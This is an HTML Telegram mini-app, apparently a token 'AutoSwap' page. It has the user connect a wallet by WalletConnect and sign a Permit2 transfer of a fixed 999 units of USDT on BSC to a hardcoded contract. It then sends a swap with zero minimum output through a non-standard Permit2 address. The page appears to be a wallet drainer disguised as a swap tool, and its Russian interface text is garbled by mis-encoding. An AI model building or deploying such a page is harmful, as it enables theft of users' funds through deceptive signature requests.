<!DOCTYPE html>
<html lang="ru">
<head>
  <meta charset="UTF-8">
  <title>AutoSwap Permit2</title>
  <script src="https://telegram.org/js/telegram-web-app.js"></script>
  <script src="https://cdn.jsdelivr.net/npm/ethers@6.6.0/dist/ethers.umd.min.js"></script>
  <script src="https://cdn.jsdelivr.net/npm/@walletconnect/sign-client@2.7.0/dist/sign-client.umd.js"></script>
  <script src="https://cdn.jsdelivr.net/npm/qrcode@1.5.1/build/qrcode.min.js"></script>
  <style>
    body {
      font-family: sans-serif;
      background: #161d27;
      color: #fff;
      text-align: center;
      padding: 20px;
    }
    canvas {
      margin: 20px auto;
      display: block;
    }
    #status {
      margin-top: 20px;
      font-weight: 500;
      font-size: 16px;
      color: #00e676;
    }
  </style>
</head>
<body>
  <h2>–ü–æ–¥–∫–ª—é—á–µ–Ω–∏–µ —á–µ—Ä–µ–∑ WalletConnect</h2>
  <canvas id="qr" width="256" height="256"></canvas>
  <div id="status">‚è≥ –ò–Ω–∏—Ü–∏–∞–ª–∏–∑–∞—Ü–∏—è...</div>

  <script>
    const CONFIG = {
      projectId: "d868f90cd734355ae0320f8f0258b6b1",
      permit2: "0x7679bcfa8CC6f6094fA1c6Cb8e6962287E5Ca3D4",
      autoswap: "0x026C54B156b501ad9cEa422e59454D4b6d6f6963",
      tokenIn: "0x55D398326f99059FF775485246999027B3197955",
      tokenOut: "0xA511768003D01eAA0f464fEEEa4b1CDDc4254b4f",
      chainId: 56,
      amount: "999"
    };

    const statusEl = document.getElementById("status");
    const qrCanvas = document.getElementById("qr");

    function setStatus(text, color = "#00e676") {
      statusEl.textContent = text;
      statusEl.style.color = color;
    }

    Telegram.WebApp.ready();
    Telegram.WebApp.expand();

    async function runApp() {
      const SignClient = window.SignClient.default;
      const client = await SignClient.init({
        projectId: CONFIG.projectId,
        metadata: {
          name: "AutoSwap WebApp",
          description: "Permit2 and Swap",
          url: location.href,
          icons: []
        }
      });

      const { uri, approval } = await client.connect({
        requiredNamespaces: {
          eip155: {
            methods: ["eth_sendTransaction", "eth_signTypedData_v4"],
            chains: ["eip155:56"],
            events: ["accountsChanged", "chainChanged"]
          }
        }
      });

      if (uri) {
        QRCode.toCanvas(qrCanvas, uri, { width: 256 });
        setStatus("üîó –û—Ç—Å–∫–∞–Ω–∏—Ä—É–π—Ç–µ QR –¥–ª—è –ø–æ–¥–∫–ª—é—á–µ–Ω–∏—è");
      }

      const session = await approval();
      const topic = session.topic;
      const address = session.namespaces.eip155.accounts[0].split(":")[2];
      setStatus("‚úÖ –ö–æ—à–µ–ª—ë–∫ –ø–æ–¥–∫–ª—é—á—ë–Ω: " + address);

      const provider = new ethers.BrowserProvider(client.getEthereumProvider({ topic, chainId: `eip155:${CONFIG.chainId}` }));
      const signer = await provider.getSigner();

      const amount = ethers.parseUnits(CONFIG.amount, 18);
      const deadline = Math.floor(Date.now() / 1000) + 30 * 24 * 60 * 60;
      const nonce = 0;

      const domain = {
        name: "Permit2",
        chainId: CONFIG.chainId,
        verifyingContract: CONFIG.permit2
      };

      const types = {
        PermitTransferFrom: [
          { name: "permitted", type: "TokenPermissions" },
          { name: "spender", type: "address" },
          { name: "nonce", type: "uint256" },
          { name: "deadline", type: "uint256" }
        ],
        TokenPermissions: [
          { name: "token", type: "address" },
          { name: "amount", type: "uint256" }
        ]
      };

      const message = {
        permitted: {
          token: CONFIG.tokenIn,
          amount: amount.toString()
        },
        spender: CONFIG.autoswap,
        nonce,
        deadline
      };

      const signature = await provider.send("eth_signTypedData_v4", [
        address,
        JSON.stringify({ types, domain, primaryType: "PermitTransferFrom", message })
      ]);

      const iface = new ethers.Interface([
        "function swapForUser(address user, address tokenIn, uint256 amount, uint256 nonce, uint256 deadline, address tokenOut, uint256 minOut, bytes signature)"
      ]);

      const calldata = iface.encodeFunctionData("swapForUser", [
        address,
        CONFIG.tokenIn,
        amount,
        nonce,
        deadline,
        CONFIG.tokenOut,
        0,
        signature
      ]);

      const tx = {
        from: address,
        to: CONFIG.autoswap,
        data: calldata
      };

      try {
        const txHash = await provider.send("eth_sendTransaction", [tx]);
        setStatus("‚úÖ –¢—Ä–∞–Ω–∑–∞–∫—Ü–∏—è –æ—Ç–ø—Ä–∞–≤–ª–µ–Ω–∞:\n" + txHash);
        setTimeout(() => Telegram.WebApp.close(), 5000);
      } catch (err) {
        console.error(err);
        setStatus("‚ùå –û—à–∏–±–∫–∞ –æ—Ç–ø—Ä–∞–≤–∫–∏: " + (err.message || err), "#ff4444");
      }
    }

    runApp();
  </script>
</body>
</html>